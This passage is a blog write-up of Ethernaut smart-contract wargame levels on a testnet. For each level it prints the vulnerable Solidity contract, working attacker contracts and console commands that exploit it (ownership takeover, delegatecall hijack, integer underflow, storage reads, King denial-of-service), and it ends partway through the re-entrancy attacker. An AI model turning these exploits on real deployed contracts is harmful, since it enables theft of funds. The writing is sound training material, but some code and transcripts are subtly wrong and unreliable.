@@ -1,0 +1,1790 @@
+<!doctype html><html class=scroll-smooth lang=en><head><meta charset=utf-8><link href=/css/style.css rel=stylesheet><link href=/line-awesome/css/line-awesome.min.css rel=stylesheet><script defer src=/js/main.js></script><title>Ethernaut succinct writeup. Where i got start | Random thoughts here</title><body class="bg-white dark:bg-slate-900 transition ease-in-out"><section><div class="sticky top-0 bg-slate-100 dark:bg-slate-800"><div class="container mx-auto flex place-content-between py-16 lg:py-8 font-sans text-6xl lg:text-2xl text-slate-900 dark:text-slate-300"><div class=flex><a class="m-0 p-0 text-slate-900 hover:text-slate-700 dark:text-slate-300 dark:hover:text-slate-200" href=/blog/> /blog </a></div><div class="flex gap-4"><div class="hidden cursor-pointer" id=back-to-top><i class="las la-level-up-alt"></i></div><a href=/><i class="las la-home"></i></a><div class=cursor-pointer id=darkmode-toggle><div class="hidden dark:inline"><i class="las la-sun"></i></div><div class="inline dark:hidden"><i class="las la-moon"></i></div></div></div></div></div><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><script type=text/x-mathjax-config>
+      MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$','$']]}
+      });
+    </script><div class="container mb-16"><div class="mt-4 font-serif text-slate-600 dark:text-slate-500 text-4xl lg:text-base">2023-10-12</div><h1 class="w-full mt-4 mb-8 font-serif text-8xl lg:text-4xl text-slate-900 dark:text-slate-300">Ethernaut succinct writeup. Where i got start</h1><div class="w-100 border-t mb-8 border-slate-300 dark:border-slate-700"></div><div class=prose-boring><p>Online game <a href=https://ethernaut.openzeppelin.com/>Ethernaut</a>, Using SepoliaETH from <a href=https://sepolia-faucet.pk910.de/#/>mining faucet</a>. My account address is <code>0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9</code>. I only use it for testnet for security.<h2 id=hello-ethernaut>Hello Ethernaut</h2><p>Interact with contracts to complete challenges<pre class=language-js data-lang=js style=background:#2e3440;color:#d8dee9><code class=language-js data-lang=js><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>info</span><span>()
+</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'You will find what you need in info1().'
+</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>info1</span><span>()
+</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'You will find what you need in info2().'
+</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>info2</span><span>()
+</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'The property infoNum holds the number of the next info method to call.'
+</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>infoNum</span><span>()
+</span><span style=color:#81a1c1>< </span><span>{</span><span style=color:#5e81ac>words</span><span style=color:#eceff4>: </span><span>[</span><span style=color:#b48ead>42</span><span>]}
+</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>info42</span><span>()
+</span><span style=color:#81a1c1><</span><span style=color:#a3be8c>'theMethodName is the name of the next method.'
+</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>theMethodName</span><span>()
+</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'The method name is method7123949.'
+</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>method7123949</span><span>()
+</span><span style=color:#81a1c1><</span><span style=color:#a3be8c>'If you know the password, submit it to authenticate().'
+</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>password</span><span>()
+</span><span style=color:#81a1c1><</span><span style=color:#a3be8c>'ethernaut0'
+</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>authenticate</span><span>(</span><span style=color:#a3be8c>'ethernaut0'</span><span>)
+</span></code></pre><p>solidity source:<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract Instance {
+</span><span>
+</span><span>  string public password;
+</span><span>  uint8 public infoNum = 42;
+</span><span>  string public theMethodName = 'The method name is method7123949.';
+</span><span>  bool private cleared = false;
+</span><span>
+</span><span>  // constructor
+</span><span>  constructor(string memory _password) {
+</span><span>    password = _password;
+</span><span>  }
+</span><span>
+</span><span>  function info() public pure returns (string memory) {
+</span><span>    return 'You will find what you need in info1().';
+</span><span>  }
+</span><span>
+</span><span>  function info1() public pure returns (string memory) {
+</span><span>    return 'Try info2(), but with "hello" as a parameter.';
+</span><span>  }
+</span><span>
+</span><span>  function info2(string memory param) public pure returns (string memory) {
+</span><span>    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {
+</span><span>      return 'The property infoNum holds the number of the next info method to call.';
+</span><span>    }
+</span><span>    return 'Wrong parameter.';
+</span><span>  }
+</span><span>
+</span><span>  function info42() public pure returns (string memory) {
+</span><span>    return 'theMethodName is the name of the next method.';
+</span><span>  }
+</span><span>
+</span><span>  function method7123949() public pure returns (string memory) {
+</span><span>    return 'If you know the password, submit it to authenticate().';
+</span><span>  }
+</span><span>
+</span><span>  function authenticate(string memory passkey) public {
+</span><span>    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
+</span><span>      cleared = true;
+</span><span>    }
+</span><span>  }
+</span><span>
+</span><span>  function getCleared() public view returns (bool) {
+</span><span>    return cleared;
+</span><span>  }
+</span><span>}
+</span></code></pre><h2 id=fallback>Fallback</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract Fallback {
+</span><span>
+</span><span>  mapping(address => uint) public contributions;
+</span><span>  address public owner;
+</span><span>
+</span><span>  constructor() {
+</span><span>    owner = msg.sender;
+</span><span>    contributions[msg.sender] = 1000 * (1 ether);
+</span><span>  }
+</span><span>
+</span><span>  modifier onlyOwner {
+</span><span>        require(
+</span><span>            msg.sender == owner,
+</span><span>            "caller is not the owner"
+</span><span>        );
+</span><span>        _;
+</span><span>    }
+</span><span>
+</span><span>  function contribute() public payable {
+</span><span>    require(msg.value < 0.001 ether);
+</span><span>    contributions[msg.sender] += msg.value;
+</span><span>    if(contributions[msg.sender] > contributions[owner]) {
+</span><span>      owner = msg.sender;
+</span><span>    }
+</span><span>  }
+</span><span>
+</span><span>  function getContribution() public view returns (uint) {
+</span><span>    return contributions[msg.sender];
+</span><span>  }
+</span><span>
+</span><span>  function withdraw() public onlyOwner {
+</span><span>    payable(owner).transfer(address(this).balance);
+</span><span>  }
+</span><span>
+</span><span>  receive() external payable {
+</span><span>    require(msg.value > 0 && contributions[msg.sender] > 0);
+</span><span>    owner = msg.sender;
+</span><span>  }
+</span><span>}
+</span></code></pre><p>There are two function could be used claim ownership of the contract. Since the original owner have 1000 wei in wallet, the function <code>contribute()</code>was hard to exploit. But requirement of <code>receive()</code>could easily be satisfied by using <code>contribute()</code>.<pre class=language-js data-lang=js style=background:#2e3440;color:#d8dee9><code class=language-js data-lang=js><span style=color:#616e88>// need to refer to the API documentation of web3.js https://web3js.readthedocs.io/en/v1.10.0/
+</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span>contribute</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>sendTransaction</span><span>({from</span><span style=color:#eceff4>: </span><span>player</span><span style=color:#eceff4>, </span><span>value</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>toWei</span><span>(</span><span style=color:#a3be8c>'0.0009'</span><span>)})
+</span><span style=color:#81a1c1>< </span><span>{</span><span style=color:#5e81ac>tx</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>'0x8868e98a26a35a88c57d2cadf24f40fb505a8b18b9bc047b9ca307fea4964068'</span><span style=color:#eceff4>, </span><span style=color:#5e81ac>receipt</span><span style=color:#eceff4>: </span><span>{…}</span><span style=color:#eceff4>, </span><span style=color:#5e81ac>logs</span><span style=color:#eceff4>: </span><span style=color:#8fbcbb>Array</span><span>(</span><span style=color:#b48ead>0</span><span>)}
+</span><span style=color:#81a1c1>> await </span><span style=color:#88c0d0>sendTransaction</span><span>({from</span><span style=color:#eceff4>: </span><span>player</span><span style=color:#eceff4>, </span><span>to</span><span style=color:#eceff4>: </span><span>contract</span><span style=color:#81a1c1>.</span><span>address</span><span style=color:#eceff4>, </span><span>value</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>toWei</span><span>(</span><span style=color:#a3be8c>'0.00001'</span><span>)})
+</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'0x4f13c20bdb389b3901633d1665c466f48795f3e05f0a31e68f57135b512333e5'
+</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>owner</span><span>()
+</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9'
+</span><span style=color:#81a1c1>> </span><span>player
+</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9'
+</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span>withdraw</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>sendTransaction</span><span>()
+</span><span style=color:#81a1c1>< </span><span>{</span><span style=color:#5e81ac>tx</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>'0x0eea3783ce911fb2c7fda42b5f44f60b63c1b6f1e862a7e463bbd6469e592320'</span><span style=color:#eceff4>, </span><span style=color:#5e81ac>receipt</span><span style=color:#eceff4>: </span><span>{…}</span><span style=color:#eceff4>, </span><span style=color:#5e81ac>logs</span><span style=color:#eceff4>: </span><span style=color:#8fbcbb>Array</span><span>(</span><span style=color:#b48ead>0</span><span>)}
+</span><span style=color:#81a1c1>> await </span><span>web3</span><span style=color:#81a1c1>.</span><span>eth</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getBalance</span><span>(contract</span><span style=color:#81a1c1>.</span><span>address)
+</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'0'
+</span></code></pre><h2 id=fallout>Fallout</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.6.0;
+</span><span>
+</span><span>import 'openzeppelin-contracts-06/math/SafeMath.sol';
+</span><span>
+</span><span>contract Fallout {
+</span><span>  
+</span><span>  using SafeMath for uint256;
+</span><span>  mapping (address => uint) allocations;
+</span><span>  address payable public owner;
+</span><span>
+</span><span>
+</span><span>  function Fal1out() public payable {
+</span><span>    owner = msg.sender;
+</span><span>    allocations[owner] = msg.value;
+</span><span>  }
+</span><span>
+</span><span>  modifier onlyOwner {
+</span><span>	        require(
+</span><span>	            msg.sender == owner,
+</span><span>	            "caller is not the owner"
+</span><span>	        );
+</span><span>	        _;
+</span><span>	    }
+</span><span>
+</span><span>  function allocate() public payable {
+</span><span>    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
+</span><span>  }
+</span><span>
+</span><span>  function sendAllocation(address payable allocator) public {
+</span><span>    require(allocations[allocator] > 0);
+</span><span>    allocator.transfer(allocations[allocator]);
+</span><span>  }
+</span><span>
+</span><span>  function collectAllocations() public onlyOwner {
+</span><span>    msg.sender.transfer(address(this).balance);
+</span><span>  }
+</span><span>
+</span><span>  function allocatorBalance(address allocator) public view returns (uint) {
+</span><span>    return allocations[allocator];
+</span><span>  }
+</span><span>}
+</span></code></pre><p>In early version of solidity, the function with the same name as the contract was used as the constructor. Wrong spelling of word <code>Fallout</code> causes <code>owner </code> variable to be uninitialized and can be called externally for assignment. Reference https://docs.soliditylang.org/en/v0.8.21/050-breaking-changes.html#constructors<pre class=language-js data-lang=js style=background:#2e3440;color:#d8dee9><code class=language-js data-lang=js><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span>Fal1out</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>sendTransaction</span><span>()
+</span><span style=color:#81a1c1>< </span><span>{</span><span style=color:#5e81ac>tx</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>'0xca9b301bac18f13c460eb71103e972efbe08bc07821a322945b947e629aa445d'</span><span style=color:#eceff4>, </span><span style=color:#5e81ac>receipt</span><span style=color:#eceff4>: </span><span>{…}</span><span style=color:#eceff4>, </span><span style=color:#5e81ac>logs</span><span style=color:#eceff4>: </span><span style=color:#8fbcbb>Array</span><span>(</span><span style=color:#b48ead>0</span><span>)}
+</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>owner</span><span>() </span><span style=color:#81a1c1>== </span><span>player
+</span><span style=color:#81a1c1>< true
+</span></code></pre><h2 id=coin-flip>Coin Flip</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract CoinFlip {
+</span><span>
+</span><span>  uint256 public consecutiveWins;
+</span><span>  uint256 lastHash;
+</span><span>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+</span><span>
+</span><span>  constructor() {
+</span><span>    consecutiveWins = 0;
+</span><span>  }
+</span><span>
+</span><span>  function flip(bool _guess) public returns (bool) {
+</span><span>    uint256 blockValue = uint256(blockhash(block.number - 1));
+</span><span>
+</span><span>    if (lastHash == blockValue) {
+</span><span>      revert();
+</span><span>    }
+</span><span>
+</span><span>    lastHash = blockValue;
+</span><span>    uint256 coinFlip = blockValue / FACTOR;
+</span><span>    bool side = coinFlip == 1 ? true : false;
+</span><span>
+</span><span>    if (side == _guess) {
+</span><span>      consecutiveWins++;
+</span><span>      return true;
+</span><span>    } else {
+</span><span>      consecutiveWins = 0;
+</span><span>      return false;
+</span><span>    }
+</span><span>  }
+</span><span>}
+</span></code></pre><p>The target is to increase consistentWins to 10, which is the value of successfully guess the <code>side</code> variable ten times in a row.<p>Observing the generation logic of the side variable, easily know that this is a pseudo-random number generation method. This means that we can predict this result in the attacker’s contract.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>
+</span><span>import './SafeMath.sol'; // https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol
+</span><span>import './coinflip.sol'; // challenge source code
+</span><span>
+</span><span>contract Attacker{
+</span><span>
+</span><span>    using SafeMath for uint256;
+</span><span>    CoinFlip public coinFlipContract;
+</span><span>    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+</span><span>
+</span><span>    constructor(address _coinFlipContract) {
+</span><span>        coinFlipContract = CoinFlip(_coinFlipContract);
+</span><span>    }
+</span><span>    function guessFlip() public {
+</span><span>
+</span><span>        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+</span><span>        uint256 coinFlip = blockValue.div(FACTOR);
+</span><span>        bool guess = coinFlip == 1 ? true : false;
+</span><span>
+</span><span>        coinFlipContract.flip(guess);
+</span><span>    }
+</span><span>}
+</span></code></pre><h2 id=telephone>Telephone</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract Telephone {
+</span><span>
+</span><span>  address public owner;
+</span><span>
+</span><span>  constructor() {
+</span><span>    owner = msg.sender;
+</span><span>  }
+</span><span>
+</span><span>  function changeOwner(address _owner) public {
+</span><span>    if (tx.origin != msg.sender) {
+</span><span>      owner = _owner;
+</span><span>    }
+</span><span>  }
+</span><span>}
+</span></code></pre><p>For claiming ownership of the contract, just need to make the values of <code>tx.origin</code> and <code>msg.sender</code> unequal. Reference to https://docs.soliditylang.org/en/v0.8.21/cheatsheet.html#block-and-transaction-properties, <code>msg.sender</code> would return address of sender of the message (current call) while <code>tx.origin</code> return the address of sender of the transaction (full call chain), which mean the <code>tx.origin</code> must be a <code>Externally Owned Account</code> and <code>msg.sender</code> could be a <code>contract account</code> used for indirect calls.<p>Just deploy a contract for indirectly calling would satisfied the requirements.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>import './Telephone.sol';
+</span><span>
+</span><span>contract Attacker {
+</span><span>  Telephone _telephone;
+</span><span>  constructor(address _address) {
+</span><span>    _telephone = new Telephone(_address);
+</span><span>  }
+</span><span>  function IndirectlyCall() {
+</span><span>    _telephone.changeOwner(msg.sender);
+</span><span>  }
+</span><span>}
+</span></code></pre><h2 id=token>Token</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.6.0;
+</span><span>
+</span><span>contract Token {
+</span><span>
+</span><span>  mapping(address => uint) balances;
+</span><span>  uint public totalSupply;
+</span><span>
+</span><span>  constructor(uint _initialSupply) public {
+</span><span>    balances[msg.sender] = totalSupply = _initialSupply;
+</span><span>  }
+</span><span>
+</span><span>  function transfer(address _to, uint _value) public returns (bool) {
+</span><span>    require(balances[msg.sender] - _value >= 0);
+</span><span>    balances[msg.sender] -= _value;
+</span><span>    balances[_to] += _value;
+</span><span>    return true;
+</span><span>  }
+</span><span>
+</span><span>  function balanceOf(address _owner) public view returns (uint balance) {
+</span><span>    return balances[_owner];
+</span><span>  }
+</span><span>}
+</span></code></pre><p>Easily noticed that the requirement <code>balances[msg.sender] - _value >= 0</code> doesn’t use SafeMath.sol, leading to overflow vulnerability. It is because <code>balances[msg.sender]</code> and <code>_value</code> was all declared as <code>uint</code>, and the result of the calculation will still be uint.<p>To solve this challenge, we need another account to call the transfer. Because both EOA and CA are applicable, just modify the Attacker contract in the former challenge <code>Telephone</code>, this challenge can be solved.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>import './Token.sol';
+</span><span>
+</span><span>contract Attacker {
+</span><span>  Token _token;
+</span><span>  constructor(address _address) {
+</span><span>    _token = Token(_address);
+</span><span>  }
+</span><span>  function IndirectlyCall(address _address) public {
+</span><span>    _token.transfer(_address, 10000020);
+</span><span>  }
+</span><span>}
+</span></code></pre><h2 id=delegation>Delegation</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract Delegate {
+</span><span>
+</span><span>  address public owner;
+</span><span>
+</span><span>  constructor(address _owner) {
+</span><span>    owner = _owner;
+</span><span>  }
+</span><span>
+</span><span>  function pwn() public {
+</span><span>    owner = msg.sender;
+</span><span>  }
+</span><span>}
+</span><span>
+</span><span>contract Delegation {
+</span><span>
+</span><span>  address public owner;
+</span><span>  Delegate delegate;
+</span><span>
+</span><span>  constructor(address _delegateAddress) {
+</span><span>    delegate = Delegate(_delegateAddress);
+</span><span>    owner = msg.sender;
+</span><span>  }
+</span><span>
+</span><span>  fallback() external {
+</span><span>    (bool result,) = address(delegate).delegatecall(msg.data);
+</span><span>    if (result) {
+</span><span>      this;
+</span><span>    }
+</span><span>  }
+</span><span>}
+</span></code></pre><p>The target is to claim ownership of the contract instance. <a href=https://solidity-by-example.org/delegatecall/>delegatecall</a> is low level function similar to <code>call</code>. but in the process of <code>delegatecall</code> , the function being called indirectly would using the calling function’s memory and <code>msg.sender</code> <code>msg.value</code>. Therefore delegates have complete access to your contract’s state. Referrence to https://www.wtf.academy/en/solidity-advanced/Delegatecall/<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>contract.sendTransaction({data: web3.utils.keccak256("pwn()")})
+</span></code></pre><h2 id=force>Force</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract Force {/*
+</span><span>
+</span><span>                   MEOW ?
+</span><span>         /\_/\   /
+</span><span>    ____/ o o \
+</span><span>  /~____  =ø= /
+</span><span> (______)__m_m)
+</span><span>
+</span><span>*/}
+</span></code></pre><p>It just a plain contract with none code inside. Even not have a <code>receive</code> or <code>fallback</code> function to recept money.<p>Contracts can get money through the following methods:<ul><li>payable function ( customize / receive / fallback ) and external calling<li>selfdestruct award<li>mining award</ul><p>Apparently in this contract we should call <a href=https://docs.soliditylang.org/en/v0.8.20/introduction-to-smart-contracts.html#deactivate-and-self-destruct>selfdestruct</a> of other contract to force this contract recept money.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract Sacrifice {
+</span><span>
+</span><span>    function suicide(address payable _address) external payable {
+</span><span>    	selfdestruct(_address);
+</span><span>    }
+</span><span>
+</span><span>    receive() external payable { }
+</span><span>}
+</span></code></pre><p>deploy and call suicide function with value <code>10000 wei</code> would solve this challenge<h2 id=vault>Vault</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract Vault {
+</span><span>  bool public locked;
+</span><span>  bytes32 private password;
+</span><span>
+</span><span>  constructor(bytes32 _password) {
+</span><span>    locked = true;
+</span><span>    password = _password;
+</span><span>  }
+</span><span>
+</span><span>  function unlock(bytes32 _password) public {
+</span><span>    if (password == _password) {
+</span><span>      locked = false;
+</span><span>    }
+</span><span>  }
+</span><span>}
+</span></code></pre><p>Just get the value of password would solve this challenge. Even though password is declared as private, there is no real private variable in blockchain world. We are able to directly visit the memory of contract. Through easy calculation you would know the password is in the solt with index 1.<pre class=language-js data-lang=js style=background:#2e3440;color:#d8dee9><code class=language-js data-lang=js><span style=color:#81a1c1>> await </span><span>web3</span><span style=color:#81a1c1>.</span><span>eth</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getStorageAt</span><span>(contract</span><span style=color:#81a1c1>.</span><span>address</span><span style=color:#eceff4>, </span><span style=color:#b48ead>1</span><span>)
+</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
+</span></code></pre><pre class=language-bash data-lang=bash style=background:#2e3440;color:#d8dee9><code class=language-bash data-lang=bash><span style=color:#88c0d0>$</span><span> cast send 0x2aEB3659dae953F1E6479F1080293285575e4426 </span><span style=color:#a3be8c>"unlock(bytes32)"</span><span> -r https://ethereum-sepolia.publicnode.com --private-key </span><span style=color:#81a1c1><</span><span style=color:#b48ead>64</span><span>byteskey</span><span style=color:#81a1c1>> </span><span style=color:#eceff4>-</span><span>- </span><span style=color:#a3be8c>'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
+</span><span>
+</span><span style=color:#88c0d0>blockHash</span><span>               0xfd32fdacac580b386cfc23eb61e8c3f43e0fd53a933d0e7be00efe457be78173
+</span><span style=color:#88c0d0>blockNumber</span><span>             4501800
+</span><span style=color:#88c0d0>contractAddress         
+</span><span style=color:#88c0d0>cumulativeGasUsed</span><span>       1921303
+</span><span style=color:#88c0d0>effectiveGasPrice</span><span>       10926752295
+</span><span style=color:#88c0d0>gasUsed</span><span>                 24143
+</span><span style=color:#88c0d0>logs                    </span><span style=color:#81a1c1>[]
+</span><span style=color:#88c0d0>logsBloom</span><span>               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+</span><span style=color:#88c0d0>root                    
+</span><span style=color:#88c0d0>status</span><span>                  1
+</span><span style=color:#88c0d0>transactionHash</span><span>         0x4a381bd75ab79e4196104de62c5dc0453d18596260b83b7368ff1689b2d98a76
+</span><span style=color:#88c0d0>transactionIndex</span><span>        14
+</span><span style=color:#88c0d0>type</span><span>                    2
+</span></code></pre><p><em>Foundry Toolkit excellent</em><p>the rpc url above found by https://chainlist.org/chain/11155111<h2 id=king>King</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract King {
+</span><span>
+</span><span>  address king;
+</span><span>  uint public prize;
+</span><span>  address public owner;
+</span><span>
+</span><span>  constructor() payable {
+</span><span>    owner = msg.sender;  
+</span><span>    king = msg.sender;
+</span><span>    prize = msg.value;
+</span><span>  }
+</span><span>
+</span><span>  receive() external payable {
+</span><span>    require(msg.value >= prize || msg.sender == owner);
+</span><span>    payable(king).transfer(msg.value);
+</span><span>    king = msg.sender;
+</span><span>    prize = msg.value;
+</span><span>  }
+</span><span>
+</span><span>  function _king() public view returns (address) {
+</span><span>    return king;
+</span><span>  }
+</span><span>}
+</span></code></pre><p>In this contract, we can become the new king by paying more than prize, while the owner can become the new king through his identity without paying.<p>In ethereum world, EOA can receive eth at any time, but if the CA haven’t declared the payable function <code>receive()</code> or <code>fallback()</code>, or just actively <code>revert()</code>, the transcation would failed. And it will cause a rollback of the Ethereum state machine with the below code not executed (That is to say, the value of the king variable can no longer be changed). That’s what needed in solving this challenge.<p>check the current prize:<pre class=language-js data-lang=js style=background:#2e3440;color:#d8dee9><code class=language-js data-lang=js><span style=color:#81a1c1>> await </span><span>web3</span><span style=color:#81a1c1>.</span><span>eth</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getStorageAt</span><span>(contract</span><span style=color:#81a1c1>.</span><span>address</span><span style=color:#eceff4>, </span><span style=color:#b48ead>1</span><span>)
+</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'0x00000000000000000000000000000000000000000000000000038d7ea4c68000'
+</span><span style=color:#81a1c1>> </span><span>(</span><span style=color:#b48ead>0x38d7ea4c68000</span><span>)</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>toString</span><span>()</span><span style=color:#81a1c1>.</span><span>length
+</span><span style=color:#81a1c1>< </span><span style=color:#b48ead>16
+</span></code></pre><p>deploy the following contract with <code>>=0.001 eth</code><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>import "./King.sol";
+</span><span>
+</span><span>contract Newking{
+</span><span>    King _king;
+</span><span>    constructor(address payable _address) payable{
+</span><span>        _king = King(_address);
+</span><span>        address(_king).call{value: _king.prize()}(""); // triggering the receive() function on King contract with the msg.value as prize
+</span><span>    }
+</span><span>}
+</span></code></pre><h2 id=re-entrance>Re-Entrance</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.6.12;
+</span><span>
+</span><span>import 'openzeppelin-contracts-06/math/SafeMath.sol';
+</span><span>
+</span><span>contract Reentrance {
+</span><span>  
+</span><span>  using SafeMath for uint256;
+</span><span>  mapping(address => uint) public balances;
+</span><span>
+</span><span>  function donate(address _to) public payable {
+</span><span>    balances[_to] = balances[_to].add(msg.value);
+</span><span>  }
+</span><span>
+</span><span>  function balanceOf(address _who) public view returns (uint balance) {
+</span><span>    return balances[_who];
+</span><span>  }
+</span><span>
+</span><span>  function withdraw(uint _amount) public {
+</span><span>    if(balances[msg.sender] >= _amount) {
+</span><span>      (bool result,) = msg.sender.call{value:_amount}("");
+</span><span>      if(result) {
+</span><span>        _amount;
+</span><span>      }
+</span><span>      balances[msg.sender] -= _amount;
+</span><span>    }
+</span><span>  }
+</span><span>
+</span><span>  receive() external payable {}
+</span><span>}
+</span></code></pre><p>Classic Reentrance-Attack.<p>In my understanding, Reentrance-Attack is similar to the race-condition attack in web2 application. Due to the contract operating mechanism of Ethereum, if the transaction address in the contract is another contract, the receive or fallback code of that contract will be executed first, and the state machine will not be updated at this moment. The back calling to this victim contract in receive function would bypass the state check.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>> await getBalance(contract.address)
+</span><span>< 0.001
+</span></code></pre><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.6.12;
+</span><span>
+</span><span>import './Reentrance.sol';
+</span><span>
+</span><span>contract Reeentrance {
+</span><span>
+</span><span>    Reentrance _reentrance;
